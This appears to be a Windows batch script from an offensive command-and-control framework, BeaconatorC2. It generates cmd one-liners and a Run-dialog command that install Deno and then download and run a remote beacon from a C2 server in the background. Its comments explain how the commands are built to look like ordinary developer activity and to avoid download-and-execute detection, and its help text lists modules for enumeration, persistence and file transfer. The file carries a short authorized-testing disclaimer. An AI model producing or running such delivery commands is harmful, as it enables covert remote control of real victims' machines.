@echo off
setlocal
rem =====================================================================
rem Deno One-Liner Beacon Generator for BeaconatorC2 (Windows)
rem
rem Generates a single cmd.exe line (pure cmd, no PowerShell in the
rem default path) that works from a clean slate (no Deno installed):
rem
rem   Stage 1: Installs Deno (if missing) using script-based installers:
rem              1. winget (native Microsoft package manager traffic)
rem              2. official deno.land install.ps1 (curl + powershell
rem                 -File, only if winget is unavailable or fails)
rem            An existing deno.exe on PATH or in the winget Links /
rem            Packages, scoop, choco or %USERPROFILE%\.deno\bin
rem            locations is reused.
rem   Stage 2/3: The beacon is fetched BY DENO ITSELF as a remote module:
rem            start "" /b deno run -A
rem              "http://<server>:<port>/<endpoint>?data=to_beacon|deno_beacon.js"
rem            The C2's HTTP receiver serves files\deno_beacon.js in
rem            response to a GET with ?data=to_beacon|deno_beacon.js
rem            (the to_beacon file-transfer command), so Deno's own module
rem            loader downloads and runs the beacon. The beacon is plain
rem            JavaScript and derives its configuration from the module URL,
rem            so no arguments are required. No curl, no temp file, no
rem            pipe-to-shell, no download-then-execute pattern anywhere on
rem            the command line - it looks like a normal "winget install"
rem            + "deno run <remote script>" dev action.
rem
rem Delivery:
rem   - cmd prompt : paste the one-liner (works from a clean slate).
rem   - Run dialog : single command (~215 chars): installs Deno via winget,
rem     refreshes the session PATH from HKCU\Environment using DELAYED
rem     expansion (!PATH! - the Run dialog pre-expands %PATH% env vars in
rem     pasted commands, which silently breaks a %PATH%-based refresh), then
rem     runs "deno run -A <module url>" by name - no unusual file path ever
rem     appears on the command line.
rem
rem Implementation note: cmd's "if" statement absorbs the rest of a line
rem (including &-chained commands) into its conditional body, so the
rem install stages are errorlevel-chained instead: each stage ends with
rem "if defined DNX (ver>nul) else (cmd /c exit 1)" and stages are joined
rem with ||, so they stop as soon as Deno is resolved. Variables set
rem earlier in the same line cannot be read with %VAR% (parse-time
rem expansion), so the resolved path is relayed through a for /f loop
rem variable at execution time.
rem
rem Use only for authorized security testing. See LICENSE / README.md.
rem =====================================================================

set "SERVER=127.0.0.1"
set "PORT=8080"
set "ENDPOINT=/"
set "INTERVAL=15"
set "ACTION="
set "SCRIPT_DIR=%~dp0"

:parse
if "%~1"=="" goto :parsed
if /i "%~1"=="-h" goto :help
if /i "%~1"=="--help" goto :help
if /i "%~1"=="-s" set "SERVER=%~2"
if /i "%~1"=="--server" set "SERVER=%~2"
if /i "%~1"=="-p" set "PORT=%~2"
if /i "%~1"=="--port" set "PORT=%~2"
if /i "%~1"=="-e" set "ENDPOINT=%~2"
if /i "%~1"=="--endpoint" set "ENDPOINT=%~2"
if /i "%~1"=="-i" set "INTERVAL=%~2"
if /i "%~1"=="--interval" set "INTERVAL=%~2"
if /i "%~1"=="-g" set "ACTION=generate"
if /i "%~1"=="--generate" set "ACTION=generate"
if /i "%~1"=="-c" set "ACTION=generate"
if /i "%~1"=="--custom" set "ACTION=generate"
shift
goto :parse

:parsed
if "%ACTION%"=="generate" goto :generate
goto :help

:generate
set "STAGE_DIR=%SCRIPT_DIR%..\files"
if not exist "%STAGE_DIR%\" (
    echo [!] files\ directory not found - run this generator from the repo,
    echo     or copy beacons\deno_beacon.js to the server's files\ folder.
    echo     The beacon module must be staged there for deno to fetch it.
)
if exist "%SCRIPT_DIR%deno_beacon.js" (
    if exist "%STAGE_DIR%\" (
        copy /y "%SCRIPT_DIR%deno_beacon.js" "%STAGE_DIR%\deno_beacon.js" >nul
        echo [+] Staged deno_beacon.js into the server's files\ directory
    )
)
echo.
echo # Deno One-Liner Beacon for BeaconatorC2 (Windows - clean slate, pure cmd)
echo # Server: %SERVER%:%PORT%%ENDPOINT%  Interval: %INTERVAL%s
echo # Works with a default HTTP receiver (endpoint /).
echo.
echo # 1) Paste the following single line into a cmd prompt:
echo.
set "TMPL=%TEMP%\deno_oneliner_%RANDOM%.txt"
>"%TMPL%" echo set "DNX="^&((where deno ^>nul 2^>^&1^&^&for /f "delims=" %%x in ('where deno') do @set "DNX=%%x"^&if defined DNX (ver^>nul) else (cmd /c exit 1))^|^|(winget install --id DenoLand.Deno -e -h --accept-package-agreements ^>nul 2^>^&1^&(for /d %%y in ("%%LOCALAPPDATA%%\Microsoft\WinGet\Packages\DenoLand.Deno*") do @if exist "%%y\deno.exe" set "DNX=%%y\deno.exe")^&if defined DNX (ver^>nul) else (cmd /c exit 1))^|^|((for %%c in ("%%LOCALAPPDATA%%\Microsoft\WinGet\Links\deno.exe" "C:\ProgramData\Microsoft\WinGet\Links\deno.exe" "%%USERPROFILE%%\.deno\bin\deno.exe" "%%USERPROFILE%%\scoop\shims\deno.exe" "C:\ProgramData\chocolatey\bin\deno.exe") do @(if not defined DNX if exist %%c set "DNX=%%~c"))^&if defined DNX (ver^>nul) else (cmd /c exit 1))^|^|(curl -s -L "https://deno.land/install.ps1" -o "%%TEMP%%\di.ps1"^&^&powershell -NoP -EP Bypass -File "%%TEMP%%\di.ps1" ^>nul 2^>^&1^&del "%%TEMP%%\di.ps1"^>nul 2^>^&1^&if exist "%%USERPROFILE%%\.deno\bin\deno.exe" set "DNX=%%USERPROFILE%%\.deno\bin\deno.exe"))^&if defined DNX (for /f "tokens=1*delims==" %%a in ('set DNX') do @(start "" /b "%%b" run -A "http://__SERVER__:__PORT____ENDPOINT__?data=to_beacon|deno_beacon.js" __SERVER__ __PORT__ __ENDPOINT__ __INTERVAL__)^&set "DNX=")
powershell -NoP -EP Bypass -Command "(Get-Content -Raw '%TMPL%').Replace('__SERVER__','%SERVER%').Replace('__PORT__','%PORT%').Replace('__ENDPOINT__','%ENDPOINT%').Replace('__INTERVAL__','%INTERVAL%')"
del "%TMPL%" >nul 2>&1
echo.
echo # 2) Or paste this single command into the Run dialog ^(Win+R^):
echo #    ^(installs Deno via winget, refreshes PATH from the registry using
echo #    delayed expansion - the Run dialog cannot pre-expand !PATH! the way
echo #    it can %PATH%, which silently breaks the command - then runs deno^)
echo.
echo cmd /v:on /c winget install DenoLand.Deno -e -h^&for /f "tokens=2*" %%a in ('reg query HKCU\Environment /v PATH') do @if not "%%b"=="" set "PATH=!PATH!;%%b"^&deno run -A "http://%SERVER%:%PORT%%ENDPOINT%?data=to_beacon|deno_beacon.js"
echo.
echo #    A console window stays visible until the beacon exits ^(use the
echo #    Cleanup module to end it^). The Run command runs winget without
echo #    --accept-package-agreements for length; Deno's package carries no
echo #    package agreement, but a first-ever winget source agreement prompt
echo #    may appear once ^(accept it and re-run^).
echo.
echo # Notes:
echo #  - Requires an HTTP receiver on the C2 (default endpoint /) and
echo #    files\deno_beacon.js staged (this generator copies it for you).
echo #  - Deno install chain: existing PATH install, then winget, then the
echo #    official deno.land installer; winget/scoop/choco/.deno locations
echo #    are reused when present. Works from a clean slate.
echo #  - Pure cmd: no PowerShell in the default path. PowerShell only runs
echo #    the official deno.land installer if winget is absent.
echo #  - The beacon is fetched by deno itself as a remote module - no curl,
echo #    no temp files, no download-then-execute pattern on the command line.
echo #  - The one-liner is one physical line; it may wrap in your terminal.
echo #  - A console window stays visible until the beacon exits (the beacon
echo #    is attached to it). Use the Cleanup module to end it.
goto :end

:help
echo Deno One-Liner Beacon Generator for BeaconatorC2 (Windows)
echo.
echo Usage: %~nx0 [OPTIONS]
echo.
echo OPTIONS:
echo     -h, --help              Show this help message
echo     -s, --server SERVER     Server IP/hostname (default: 127.0.0.1)
echo     -p, --port PORT         HTTP receiver port (default: 8080)
echo     -e, --endpoint PATH     HTTP endpoint (default: / - matches the
echo                             receiver's default endpoint_path)
echo     -i, --interval SECONDS  Check-in interval (default: 15)
echo     -g, --generate          Generate default one-liner
echo     -c, --custom            Generate custom one-liner with provided options
echo.
echo Examples:
echo     %~nx0 --generate
echo     %~nx0 --custom --server 192.168.1.100 --port 8080
echo.
echo Delivery:
echo     1. cmd prompt: paste the one-liner (clean slate, installs Deno).
echo     2. Run dialog: paste the single command printed by the generator
echo        (winget install + registry PATH refresh + deno run by name).
echo.
echo How it works:
echo     1. Installs Deno via script-based installers (winget, the official
echo        deno.land install.ps1) if not already present.
echo     2. Fetches the beacon as a remote Deno module: the C2 serves
echo        files\deno_beacon.js in response to a GET of
echo        http://server:port/?data=to_beacon|deno_beacon.js
echo        (the to_beacon file-transfer command over the HTTP receiver).
echo     3. Runs the beacon hidden in the background; the beacon reads its
echo        config from the module URL (or CLI args / BC_* env vars).
echo.
echo Modules (full beacon):
echo     SystemInfo, ProcessEnum, NetworkEnum, UserEnum, ServiceEnum,
echo     EnvironmentEnum, FileSearch, PortScan, DNSEnum, SSH_Discovery,
echo     Persistence (registry/schtasks/startup), DownloadFile, UploadFile,
echo     Cleanup. See schemas\deno_beacon.yaml for operator-side commands.

:end
endlocal
